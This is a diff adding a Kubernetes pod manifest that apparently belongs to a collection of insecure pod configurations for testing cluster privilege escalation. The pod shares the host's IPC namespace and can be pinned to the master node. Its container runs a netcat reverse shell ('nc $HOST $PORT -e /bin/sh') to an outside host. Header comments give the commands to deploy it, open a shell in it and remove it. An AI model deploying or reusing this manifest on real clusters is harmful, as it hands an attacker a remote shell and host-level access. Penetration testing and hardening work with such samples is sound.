@@ -1,0 +1,23 @@
+###########################################################
+## Deploy: kubectl -n [namespace] apply -f pod-hostipc-only.yaml 
+## Access: kubectl -n [namespace] exec -it pod-hostipc -- bash
+## Remove: kubectl -n [namespace] delete -f pod-hostipc-only.yaml
+###########################################################
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-hostipc
+  labels:
+    app: hostipc
+spec:
+  hostIPC: true
+  containers:
+  - image: busybox
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
+
+    imagePullPolicy: IfNotPresent
+    name: hostipc
+  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
+  #nodeName: k8s-master
+  restartPolicy: Always
